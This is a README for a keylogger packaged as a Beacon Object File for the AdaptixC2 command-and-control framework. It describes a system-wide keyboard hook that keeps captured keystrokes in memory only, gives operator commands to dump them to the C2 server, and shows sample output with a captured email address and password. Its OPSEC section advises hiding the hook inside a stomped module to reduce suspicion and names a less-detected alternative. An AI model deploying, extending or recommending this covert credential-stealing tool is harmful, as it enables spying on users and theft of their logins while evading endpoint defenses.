# Keylogger-BOF

An async keylogger implemented as a Beacon Object File (BOF) for [AdaptixC2](https://github.com/Adaptix-Framework/AdaptixC2).

Captures keystrokes system-wide via a low-level keyboard hook (`WH_KEYBOARD_LL`) without spawning any additional processes. All captured data lives in named shared memory — never touches disk.

---

## How it works

`keylog_start` runs as an **async BOF** (`-a` flag), installing a `WH_KEYBOARD_LL` hook and entering a `MsgWaitForMultipleObjects` loop in the background. The beacon remains fully operational while the keylogger runs.

Captured keystrokes are written to a named `FileMapping` object (`Global\keylog_buf`) — a fixed circular buffer in RAM. A named `Event` (`Global\keylog_stop`) and `Mutex` (`Global\keylog_mutex`) coordinate between the async BOF and the sync dump/stop BOFs.

```
keylog_start (async)
     │
     ├── WH_KEYBOARD_LL hook installed
     ├── MsgWaitForMultipleObjects loop (INFINITE)
     │       ├── keystroke → process_key() → shared memory buffer
     │       └── stop event / WM_QUIT → cleanup → exit
     │
keylog_dump (sync)          keylog_stop (sync)
     │                              │
     └── read shared memory         ├── final dump
         print to C2                ├── SetEvent(stop)
         reset buffer               ├── PostThreadMessage(WM_QUIT)
                                    └── cleanup verification
```

### Kernel objects

| Name | Type | Purpose |
|------|------|---------|
| `Global\keylog_buf` | FileMapping | Circular buffer + metadata (KEYLOG_CTX + data) |
| `Global\keylog_stop` | Event (manual reset) | Signals the async BOF to exit |
| `Global\keylog_mutex` | Mutex | Protects concurrent buffer access |

All objects are destroyed when `keylog_stop` completes.

---

## Features

- **No process spawn** — hook runs inside the beacon process
- **No disk I/O** — all data in named shared memory (RAM only)
- **Window context** — each window change is tagged with timestamp and title
- **Smart title normalization** — ignores dirty markers (`*`, `#`) used by editors to avoid spurious window-change headers mid-word
- **Special key capture** — `[ENTER]`, `[BACK]`, `[TAB]`, `[F1-F12]`, `[DEL]`, `[ESC]`, etc.
- **AltGr support** — correct character translation for non-US keyboard layouts
- **Configurable buffer** — 64KB default, up to 4096KB
- **Crash-safe** — if the beacon dies, shared memory is released by the OS automatically

---

## Usage

```
keylog_start [buffer_kb]    Start keylogger (default: 64KB buffer)
keylog_dump                 Flush captured keystrokes to C2 and reset buffer
keylog_stop                 Final dump + stop + cleanup
```

### Examples

```
keylog_start                 <- 64KB buffer
keylog_start 256             <- 256KB buffer for long engagements
keylog_dump                  <- retrieve captured data at any time
keylog_stop                  <- stop and clean up
```

### Sample output

```
[+] Keylogger dump -- 121 keystrokes captured
    Active window : pruebas: Bloc de notas
----------------------------------------
pruebas[ENTER]
[ENTER]

[17:09:27 - pruebas: Bloc de notas]
Hi, carlos :)

[17:10:21 - password: Bloc de notas]
credentials for github[ENTER]
[ENTER]
email: dev.123@gmail.com[ENTER]
password: Flaxypass1234
----------------------------------------
```

---

## Build

### Requirements

- `x86_64-w64-mingw32-gcc`
- `i686-w64-mingw32-gcc`

On Debian/Ubuntu:
```bash
sudo apt install mingw-w64
```

### Compile

```bash
make all        # both x64 and x86
make clean
```

Output `.o` files go to `_bin/`.

---

## Installation (AdaptixC2)

1. Clone the repo and compile:
```bash
git clone https://github.com/<you>/Keylogger-BOF
cd Keylogger-BOF
make all
```

2. Load the extension in AdaptixC2:
```
Extensions → script manager → Local Scripts → keylog.axs
```

3. The three commands will appear under the **Keylogger-BOF** group.

---

## Project structure

```
Keylogger-BOF/
├── src/
│   ├── keylog_start_bof.c   ← async BOF: hook install + message loop
│   ├── keylog_dump_bof.c    ← sync BOF: read + reset shared buffer
│   ├── keylog_stop_bof.c    ← sync BOF: final dump + signal stop + cleanup
│   ├── beacon.h             ← BOF API definitions
│   ├── bofdefs.h            ← DFR macro helpers
│   └── base.c               ← internal_printf, bofstart/stop helpers
├── _bin/                    ← compiled .o files (after make)
├── keylog.axs               ← AdaptixC2 extension script
├── Makefile
└── README.md
```

---

## OPSEC considerations

`WH_KEYBOARD_LL` is a well-known technique and is monitored by most EDRs. Specific detections to be aware of:

- **Event ID 4656** — object handle requests on the SCM (unrelated but common correlation point)
- **MDE / CrowdStrike / SentinelOne** — all have behavioral signatures for global LL keyboard hooks installed from non-GUI or memory-resident processes
- The hook is installed in the **beacon process** — if the beacon is running inside a stomped module, the hook origin will appear as the host process (e.g. `svchost.exe`), which reduces suspicion

A lower-noise alternative would be `RegisterRawInputDevices` with `RIDEV_INPUTSINK` — less commonly signatured, but requires a window handle and is more complex to implement in a BOF context.
